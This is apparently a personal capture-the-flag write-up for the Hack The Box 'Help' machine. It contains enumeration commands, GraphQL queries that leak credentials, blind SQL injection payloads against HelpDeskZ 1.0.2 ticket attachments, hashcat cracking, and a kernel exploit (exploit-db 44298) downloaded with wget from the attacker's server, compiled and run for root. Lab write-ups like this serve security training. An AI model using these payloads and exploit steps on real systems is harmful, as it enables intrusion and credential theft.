---
tags:
  - HTB
  - Retired
  - Linux
  - graphql
  - api
  - KernelExploit
creation date: 2019-09-01
Date Completed: 2024-08-21
CVEs: 
URL: 
IP: 10.129.98.114
---
## Information Gathering

```
sudo nmap -sV -sC -sT -O -p- $IP
```
```
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18
|_http-title: Did not follow redirect to http://help.htb/
|_http-server-header: Apache/2.4.18 (Ubuntu)
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
```

### Port 80
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt:FUZZ -u http://help.htb/FUZZ -c
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt:FUZZ -u http://help.htb/FUZZ -c
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u http://help.htb -H "HOST: FUZZ.help.htb" -c

/support/readme.html
    Helpdeskz Version: 1.0.2 from 1st June 2015
/support/captcha.php
/support/index.php
    http://help.htb/support/?v=submit_ticket
/support/LICENSE.txt
/support/

### Port 3000

```
POST /graphql HTTP/1.1
Host: help.htb:3000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: close
Cookie: PHPSESSID=1a24b2irvu2974cpm9ver6h573
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
If-None-Match: W/"51-gr8XZ5dnsfHNaB2KgX/Gxm9yVZU"
Content-Type: application/*json*
Content-Length: 62


query {
  users {
    id
    username
    role
  }
}
```
https://stackoverflow.com/questions/59200152/graphql-post-body-missing-did-you-forget-use-body-parser-middleware
https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html#access-control

+++ More research into GraphQL and API testing +++
https://cardano.stackexchange.com/questions/282/hasura-graphql-playground-throws-get-query-missing-400-status-code-response

Getting errors but useful errors with this:
GET /graphql?query={user{username}}
GET /graphql?query={user{password}}

helpme@helpme.com
godhelpmeplz

++++ This does not work ++++
https://www.exploit-db.com/exploits/40300
exploit.py http://10.129.228.86/support/ phpshell.php

# Foothold


1. Submit a ticket with a standard image attachment
2. Go to view your ticket, copy the link to your image attachment and navigate to it 
example: http://help.htb/support/?v=view_tickets&action=ticket&param[]=5&param[]=attachment&param[]=2&param[]=7

3. Test it for SQLi... 

example: http://help.htb/support/?v=view_tickets&action=ticket&param[]=5&param[]=attachment&param[]=2&param[]=7+and+1=1+--+-

4. Do some injecting to confirm the user the app runs as is admin

GET /support/?v=view_tickets&action=ticket&param[]=5&param[]=attachment&param[]=2&param[]=7+and+(select+(username)+from+staff+limit+0,1)+=+'admin'+--+-

The key is IF the image returns that means your query is TRUE. IF the image (or whatever your attachment was) does not return that means your query if FALSE.

5. Now we gotta figure out the password... this is where it gets complicated because you can only do it one letter at a time :(

GET /support/?v=view_tickets&action=ticket&param[]=5&param[]=attachment&param[]=2&param[]=7+and+substr((select+password+from+staff+limit+0,1),1,1)+=+'§a§'+--+- 

Use Burp Intruder to figure out what it is or use the script from the walkthrough haha
creating the intrudor payload
printf '%s \n' {0..9}; echo
printf '%s \n' {a..z}; echo
printf '%s \n' {A..Z}; echo
or https://github.com/fuzzdb-project/fuzzdb/blob/master/wordlists-misc/wordlist-alphanumeric-case.txt

you also have to adjust the character its looking at using substr
example:
substr((select+password+from+staff+limit+0,1),1,1)+=+'§a§'+--+- 
substr((select+password+from+staff+limit+0,1),2,1)+=+'§a§'+--+- 
substr((select+password+from+staff+limit+0,1),3,1)+=+'§a§'+--+- 

d318f44739dced6679
d318f44739dced66793b1a603028133a76ae680e

NOTE: The script provided in the walkthrough is trash. I used gemini to modify it so it actually works. However, even that isn't working... Seems just manual bruteforce with Burp would have been better...

hashcat -m 100 d318f44739dced66793b1a603028133a76ae680e ~/rockyou.txt
Welcome1

5. Gotta do the same shit to enumerate the use :(

I aint doing that shit since none of the scripts work. I would have to do everything with burp and I dont wanna...

Also, it litterally provides nothing. We still have to "guess" the ssh username... which is "help". Which coinsidentialy is NOT in xato-top-10-million WTF... but it is in xato-net-10-million-usernames-dup.txt... whyyyyyyyyyy

ssh help@10.129.228.86

# Priv Esc
uname -a 
4.4.0-116-generic

searchsploit 4.4.0-116-generic
searchsploit -m 44298
python3 -m http.server
wget http://10.10.15.64:8000/44298.c

gcc 44298.c -o exploit
./exploit

whoami
cd /root
cat root.txt


Notes:
the foothold on this sucked so bad. not sure how they call that "easy". the priv esc was stupid easy though. without the walkthough it would have taken me a bit longer but i would have gotten there eventually...







